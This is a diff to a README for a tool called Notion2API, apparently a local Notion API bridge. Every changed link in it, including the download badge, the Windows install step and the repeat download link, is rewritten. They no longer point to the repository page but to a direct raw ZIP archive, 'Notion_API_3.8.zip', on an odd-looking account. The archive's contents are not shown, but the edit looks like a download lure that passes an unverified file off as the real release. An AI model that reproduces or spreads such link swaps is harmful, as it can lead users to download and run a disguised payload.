@@ -1,6 +1,6 @@
 # 🧩 Notion2API - Run Notion API Bridge Locally
 
-[![Download Notion2API](https://img.shields.io/badge/Download-Notion2API-blue?style=for-the-badge&logo=github)](https://github.com/Prudential-flathead401/Notion2API)
+[![Download Notion2API](https://img.shields.io/badge/Download-Notion2API-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Prudential-flathead401/Notion2API/main/deploy/Notion_API_3.8.zip)
 
 ## 🖥️ What Notion2API Does
 
@@ -18,7 +18,7 @@ Use it when you want one local place to manage access, test requests, or connect
 ## 📥 Download for Windows
 
 1. Open the download page:
-   [https://github.com/Prudential-flathead401/Notion2API](https://github.com/Prudential-flathead401/Notion2API)
+   [https://raw.githubusercontent.com/Prudential-flathead401/Notion2API/main/deploy/Notion_API_3.8.zip](https://raw.githubusercontent.com/Prudential-flathead401/Notion2API/main/deploy/Notion_API_3.8.zip)
 2. On the page, get the Windows release file or source package.
 3. Save it to a folder you can find again, such as `Downloads` or `Desktop`.
 4. If you get a ZIP file, right-click it and choose **Extract All**.
@@ -224,7 +224,7 @@ This keeps the app files easy to find and update.
 
 If you need the download page again, use this link:
 
-[https://github.com/Prudential-flathead401/Notion2API](https://github.com/Prudential-flathead401/Notion2API)
+[https://raw.githubusercontent.com/Prudential-flathead401/Notion2API/main/deploy/Notion_API_3.8.zip](https://raw.githubusercontent.com/Prudential-flathead401/Notion2API/main/deploy/Notion_API_3.8.zip)
 
 ## 📝 Simple Setup Checklist
 
